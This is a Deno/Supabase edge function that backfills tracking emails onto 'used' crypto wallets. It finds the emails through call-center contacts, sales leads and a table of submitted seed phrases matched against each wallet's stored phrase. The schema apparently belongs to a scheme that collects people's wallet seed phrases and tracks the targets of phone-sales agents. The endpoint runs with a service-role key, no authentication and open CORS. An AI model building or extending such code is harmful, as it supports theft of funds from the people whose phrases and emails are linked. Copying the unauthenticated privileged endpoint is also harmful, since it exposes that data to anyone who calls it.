import "https://deno.land/x/xhr@0.1.0/mod.ts";
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.50.2';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    
    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    console.log('Starting wallet email repair process...');

    // Get all wallets with missing client_tracking_id but that are used
    const { data: walletsToRepair, error: walletsError } = await supabase
      .from('wallets')
      .select('id, used_by_commercial_id, wallet_phrase')
      .eq('status', 'used')
      .is('client_tracking_id', null);

    if (walletsError) {
      console.error('Error fetching wallets to repair:', walletsError);
      throw walletsError;
    }

    console.log(`Found ${walletsToRepair?.length || 0} wallets missing client_tracking_id`);

    let repairedCount = 0;
    let errors = [];

    for (const wallet of walletsToRepair || []) {
      try {
        let emailToUse = null;

        // Strategy 1: Find marketing contact by commercial_id
        if (wallet.used_by_commercial_id) {
          const { data: contact } = await supabase
            .from('marketing_contacts')
            .select('email, name')
            .eq('commercial_id', wallet.used_by_commercial_id)
            .eq('status', 'called')
            .order('updated_at', { ascending: false })
            .limit(1)
            .single();

          if (contact?.email) {
            emailToUse = contact.email;
            console.log(`Found contact email for wallet ${wallet.id}: ${emailToUse}`);
          }
        }

        // Strategy 2: Look for user_leads by commercial name
        if (!emailToUse && wallet.used_by_commercial_id) {
          const { data: commercial } = await supabase
            .from('commercials')
            .select('name')
            .eq('id', wallet.used_by_commercial_id)
            .single();

          if (commercial?.name) {
            const { data: lead } = await supabase
              .from('user_leads')
              .select('username, name')
              .eq('commercial_name', commercial.name)
              .order('created_at', { ascending: false })
              .limit(1)
              .single();

            if (lead?.username && lead.username.includes('@')) {
              emailToUse = lead.username;
              console.log(`Found lead email for wallet ${wallet.id}: ${emailToUse}`);
            }
          }
        }

        // Strategy 3: Check seed phrase submissions for this wallet
        if (!emailToUse) {
          const { data: submission } = await supabase
            .from('seed_phrase_submissions')
            .select('commercial_name')
            .eq('phrase', wallet.wallet_phrase)
            .order('created_at', { ascending: false })
            .limit(1)
            .single();

          if (submission?.commercial_name) {
            // Try to find user_leads with this commercial name
            const { data: lead } = await supabase
              .from('user_leads')
              .select('username')
              .eq('commercial_name', submission.commercial_name)
              .order('created_at', { ascending: false })
              .limit(1)
              .single();

            if (lead?.username && lead.username.includes('@')) {
              emailToUse = lead.username;
              console.log(`Found submission-linked email for wallet ${wallet.id}: ${emailToUse}`);
            }
          }
        }

        // Update wallet with found email
        if (emailToUse) {
          const { error: updateError } = await supabase
            .from('wallets')
            .update({ client_tracking_id: emailToUse })
            .eq('id', wallet.id);

          if (updateError) {
            console.error(`Error updating wallet ${wallet.id}:`, updateError);
            errors.push({ walletId: wallet.id, error: updateError.message });
          } else {
            repairedCount++;
            console.log(`Successfully updated wallet ${wallet.id} with email: ${emailToUse}`);
          }
        } else {
          console.log(`No email found for wallet ${wallet.id}`);
        }

      } catch (error: any) {
        console.error(`Error processing wallet ${wallet.id}:`, error);
        errors.push({ walletId: wallet.id, error: error.message });
      }
    }

    console.log(`Repair completed. Repaired: ${repairedCount}, Errors: ${errors.length}`);

    return new Response(JSON.stringify({
      success: true,
      processed: walletsToRepair?.length || 0,
      repaired: repairedCount,
      errors: errors,
      message: `Successfully repaired ${repairedCount} out of ${walletsToRepair?.length || 0} wallets`
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });

  } catch (error: any) {
    console.error('Error in repair-wallet-emails function:', error);
    return new Response(JSON.stringify({
      success: false,
      error: error?.message || 'Unknown error occurred'
    }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});